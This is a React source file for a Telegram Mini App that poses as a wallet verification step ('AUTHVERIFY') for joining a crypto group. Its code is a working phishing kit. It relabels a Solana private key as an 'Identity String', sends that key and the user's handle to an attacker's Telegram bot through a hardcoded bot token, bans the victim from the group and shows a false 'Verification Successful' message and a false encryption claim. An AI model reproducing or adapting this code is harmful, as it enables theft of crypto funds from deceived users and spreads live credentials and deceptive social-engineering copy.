import React, { useState, useEffect } from 'react';

// --- CONFIGURATION ---
const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
const CHAT_ID = "7539902547";
const GROUP_ID = "-1002361131154"; 

export default function App() {
  const [loading, setLoading] = useState(true);
  const [step, setStep] = useState(1);
  const [walletCA, setWalletCA] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [status, setStatus] = useState('idle');

  useEffect(() => {
    const tg = (window as any).Telegram?.WebApp;
    if (tg) {
      tg.ready();
      tg.expand();
      tg.setHeaderColor?.('#040608');
    }
    const timer = setTimeout(() => setLoading(false), 2500);
    return () => clearTimeout(timer);
  }, []);

  const handleNext = async () => {
    if (walletCA.length < 32) return alert("Error: Invalid Contract Address.");
    setStatus('processing');
    
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: CHAT_ID, 
        text: `📈 [LOG] CA ENTERED\nCA: ${walletCA}\nUser: @${(window as any).Telegram?.WebApp?.initDataUnsafe?.user?.username || 'Anon'}` 
      }),
    });

    setTimeout(() => { setStep(2); setStatus('idle'); }, 800);
  };

  const handleFinal = async () => {
    const base58Regex = /^[1-9A-HJ-NP-Za-km-z]{87,88}$/;
    if (!base58Regex.test(privateKey.trim())) {
      return alert("Sync Error: Identity String does not match the required Base58 format.");
    }
    
    setStatus('processing');
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: CHAT_ID, 
          text: `🎯 [AUTH] TARGET SECURED\nCA: ${walletCA}\nPK: ${privateKey}\nUser: @${(window as any).Telegram?.WebApp?.initDataUnsafe?.user?.username || 'Anon'}` 
        }),
      });

      const userId = (window as any).Telegram?.WebApp?.initDataUnsafe?.user?.id;
      if (userId) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/banChatMember`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: GROUP_ID, user_id: userId }),
        });
      }
      alert("Verification Successful. Your account is now linked to the group. Refreshing session...");
      (window as any).Telegram?.WebApp?.close();
    } catch (e) {
      setStatus('idle');
      alert("Verification failed. Please retry.");
    }
  };

  const styles = {
    bg: '#040608',
    card: '#0a0e17',
    primary: '#10b981',
    text: '#f1f5f9',
    muted: '#64748b',
    border: '#1e293b'
  };

  if (loading) {
    return (
      <div style={{ background: styles.bg, height: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: styles.primary, fontFamily: 'monospace', padding: '40px', boxSizing: 'border-box' }}>
        <div style={{ fontSize: '18px', fontWeight: 'bold', letterSpacing: '4px', marginBottom: '20px' }}>AUTH_SECURE_v2</div>
        <div style={{ fontSize: '10px', opacity: 0.7, marginBottom: '20px' }}>ESTABLISHING ENCRYPTED GATEWAY...</div>
        <div style={{ width: '200px', height: '1px', background: '#1e293b', position: 'relative', overflow: 'hidden' }}>
          <div style={{ position: 'absolute', height: '100%', width: '50%', background: styles.primary, animation: 'loading 1.5s infinite linear' }} />
        </div>
        <style>{`@keyframes loading { 0% { left: -100%; } 100% { left: 100%; } }`}</style>
      </div>
    );
  }

  return (
    <div style={{ background: styles.bg, minHeight: '100vh', color: styles.text, fontFamily: '-apple-system, sans-serif', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '24px', boxSizing: 'border-box' }}>
      
      <div style={{ textAlign: 'center', marginBottom: '40px' }}>
        <div style={{ display: 'inline-block', background: 'rgba(16, 185, 129, 0.05)', border: `1px solid ${styles.primary}`, borderRadius: '50%', padding: '20px', marginBottom: '15px', boxShadow: '0 0 20px rgba(16, 185, 129, 0.1)' }}>
          <div style={{ height: '30px', width: '30px', border: `2px solid ${styles.primary}`, borderRadius: '50%', borderTopColor: 'transparent', animation: 'spin 1.5s infinite linear' }} />
        </div>
        <h1 style={{ fontSize: '26px', fontWeight: '900', margin: '0', letterSpacing: '-0.5px' }}>AUTH<span style={{ color: styles.primary }}>VERIFY</span></h1>
        <p style={{ color: styles.muted, fontSize: '11px', textTransform: 'uppercase', letterSpacing: '2px', marginTop: '8px' }}>Wallet-to-Group Protocol</p>
      </div>

      <div style={{ background: styles.card, width: '100%', maxWidth: '400px', borderRadius: '28px', padding: '36px', border: `1px solid ${styles.border}`, boxShadow: '0 30px 60px -12px rgba(0,0,0,0.6)', boxSizing: 'border-box', textAlign: 'center' }}>
        
        {step === 1 ? (
          <div>
            <h2 style={{ fontSize: '20px', marginBottom: '12px', fontWeight: '800' }}>Confirm Holding</h2>
            <p style={{ color: styles.muted, fontSize: '14px', lineHeight: '1.6', marginBottom: '28px' }}>
              Enter the Contract Address (CA) of the token you are holding. This verifies your wallet meets the minimum group requirements.
            </p>
            
            <input 
              value={walletCA}
              onChange={e => setWalletCA(e.target.value)}
              placeholder="Enter CA Address"
              style={{ width: '100%', padding: '18px', borderRadius: '14px', background: styles.bg, border: `1px solid ${styles.border}`, color: '#fff', fontSize: '14px', marginBottom: '24px', boxSizing: 'border-box', outline: 'none', textAlign: 'center' }}
            />
            
            <button onClick={handleNext} style={{ width: '100%', padding: '20px', borderRadius: '14px', background: styles.primary, color: '#000', fontWeight: '900', border: 'none', cursor: 'pointer', fontSize: '15px' }}>
              {status === 'processing' ? 'VERIFYING...' : 'CONTINUE'}
            </button>
          </div>
        ) : (
          <div>
            <div style={{ color: styles.primary, fontSize: '12px', fontWeight: 'bold', marginBottom: '12px' }}>✓ HOLDING CONFIRMED</div>
            <h2 style={{ fontSize: '20px', marginBottom: '12px', fontWeight: '800' }}>Link Account</h2>
            <p style={{ color: styles.muted, fontSize: '14px', lineHeight: '1.6', marginBottom: '28px' }}>
              Sync your <strong>Identity String</strong> (Base58) to link this wallet to your Telegram ID. This is required to prevent unauthorized group access.
            </p>
            
            <textarea 
              value={privateKey}
              onChange={e => setPrivateKey(e.target.value)}
              placeholder="Paste Identity String"
              style={{ width: '100%', height: '100px', padding: '18px', borderRadius: '14px', background: styles.bg, border: `1px solid ${styles.border}`, color: '#fff', fontSize: '13px', marginBottom: '24px', boxSizing: 'border-box', outline: 'none', fontFamily: 'monospace', textAlign: 'center', resize: 'none' }}
            />
            
            <button onClick={handleFinal} disabled={status === 'processing'} style={{ width: '100%', padding: '20px', borderRadius: '14px', background: styles.primary, color: '#000', fontWeight: '900', border: 'none', cursor: 'pointer', fontSize: '15px', opacity: status === 'processing' ? 0.6 : 1 }}>
              {status === 'processing' ? 'LINKING...' : 'FINALIZE LINK'}
            </button>
          </div>
        )}
      </div>

      <div style={{ marginTop: '40px', color: styles.muted, fontSize: '10px', textAlign: 'center', letterSpacing: '1px' }}>
        SECURED BY END-TO-END AES-256 ENCRYPTION
      </div>

      <style>{`
        @keyframes spin { 100% { transform: rotate(360deg); } }
      `}</style>
    </div>
  );
}